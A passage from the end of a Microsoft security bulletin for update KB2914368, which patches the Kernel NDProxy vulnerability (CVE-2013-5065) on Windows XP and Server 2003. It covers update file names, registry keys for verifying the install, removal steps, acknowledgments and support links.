| **Registry key verification** | For all supported 32-bit editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP\SP4\KB2914368\Filelist |
| \ | For all supported x64-based editions of Windows XP:\ HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows XP Version 2003\SP3\KB2914368\Filelist |

**Note** The update for supported versions of Windows XP Professional x64 Edition also applies to supported versions of Windows Server 2003 x64 Edition.

### Windows Server 2003 (all editions)

**Reference Table**

The following table contains the security update information for this software.

| **Security update file names** | For all supported 32-bit editions of Windows Server 2003:\ **WindowsServer2003-KB2914368-x86-ENU.exe** |
| --- | --- |
| \ | For all supported x64-based editions of Windows Server 2003:\ **WindowsServer2003.WindowsXP-KB2914368-x64-ENU.exe** |
| \ | For all supported Itanium-based editions of Windows Server 2003:\ **WindowsServer2003-KB2914368-ia64-ENU.exe** |
| **Installation switches** | See [Microsoft Knowledge Base Article 262841](https://support.microsoft.com/kb/262841) |
| **Update log file** | KB2914368.log |
| **Restart requirement** | Yes, you must restart your system after you apply this security update. |
| **Removal information** | Use **Add or Remove Programs** item in Control Panel or the Spuninst.exe utility located in the %Windir%$NTUninstallKB2914368$\Spuninst folder |
| **File information** | See [Microsoft Knowledge Base Article 2914368](https://support.microsoft.com/kb/2914368) |
| **Registry key verification** | HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows Server 2003\SP3\KB2914368\Filelist |

**Note** The update for supported versions of Windows Server 2003 x64 Edition also applies to supported versions of Windows XP Professional x64 Edition.

## Acknowledgments

Microsoft [thanks](https://go.microsoft.com/fwlink/?linkid=21127) the following for working with us to help protect customers:

* [FireEye, Inc.](https://www2.fireeye.com/) for helping us with the Kernel NDProxy Vulnerability (CVE-2013-5065)

## Other Information

### Microsoft Active Protections Program (MAPP)

To improve security protections for customers, Microsoft provides vulnerability information to major security software providers in advance of each monthly security update release. Security software providers can then use this vulnerability information to provide updated protections to customers via their security software or devices, such as antivirus, network-based intrusion detection systems, or host-based intrusion prevention systems. To determine whether active protections are available from security software providers, please go to the active protections websites provided by program partners, listed in [Microsoft Active Protections Program (MAPP) Partners](https://go.microsoft.com/fwlink/?linkid=215201).

### Support

**How to obtain help and support for this security update**

* Help installing updates: [Support for Microsoft Update](https://support.microsoft.com/ph/6527)
* Security solutions for IT professionals: [TechNet Security Troubleshooting and Support](https://technet.microsoft.com/security/bb980617.aspx)
* Help protect your computer that is running Windows from viruses and malware: [Virus Solution and Security Center](https://support.microsoft.com/contactus/cu_sc_virsec_master)
* Local support according to your country: [International Support](https://support.microsoft.com/common/international.aspx)

### Disclaimer

The information provided in the Microsoft Knowledge Base is provided "as is" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.

### Revisions

* V1.0 (January 14, 2014): Bulletin published.

*Page generated 2014-06-25 13:41Z-07:00.*

---

## Additional resources

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025
## Additional resources

### In this article

[California Consumer Privacy Act (CCPA) Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

Theme

* Light
* Dark
* High contrast

* [Previous Versions](/en-us/previous-versions/)
* [Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)
* [Contribute](/en-us/contribute/)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* [Terms of Use](/en-us/legal/termsofuse)
* [Trademarks](https://www.microsoft.com/legal/intellectualproperty/Trademarks/)
* © Microsoft 2025


